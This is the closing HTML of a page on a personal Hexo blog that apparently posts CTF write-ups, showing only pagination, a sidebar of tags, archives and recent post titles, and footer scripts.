      <a data-url="http://yoursite.com/2019/07/14/赛博杯2019_Write_Up/" data-id="ck2g3l2ji000zlgv3ph4k1r22" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-UP/">Write UP</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-UP/">Write UP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-Up/">Write Up</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book/">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/navigation/">navigation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/note/">note</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/private/">private</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Write-UP/" style="font-size: 16.67px;">Write UP</a> <a href="/tags/Write-Up/" style="font-size: 13.33px;">Write Up</a> <a href="/tags/book/" style="font-size: 10px;">book</a> <a href="/tags/navigation/" style="font-size: 10px;">navigation</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/private/" style="font-size: 10px;">private</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2099/12/">December 2099</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2099/12/31/题目导航(手动置顶)/">题目导航(手动置顶)</a>
          </li>
        
          <li>
            <a href="/2019/10/07/LCTF2018_bestphp's_revenge/">LCTF2018-bestphp&#39;s revenge</a>
          </li>
        
          <li>
            <a href="/2019/10/07/rsa套路笔记/">RSA套路笔记</a>
          </li>
        
          <li>
            <a href="/2019/10/01/遇见了一个人，犯了一个错/">遇见了一个人，犯了一个错</a>
          </li>
        
          <li>
            <a href="/2019/09/27/CISCN2019Easyweb/">CISCN2019Easyweb</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 V<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>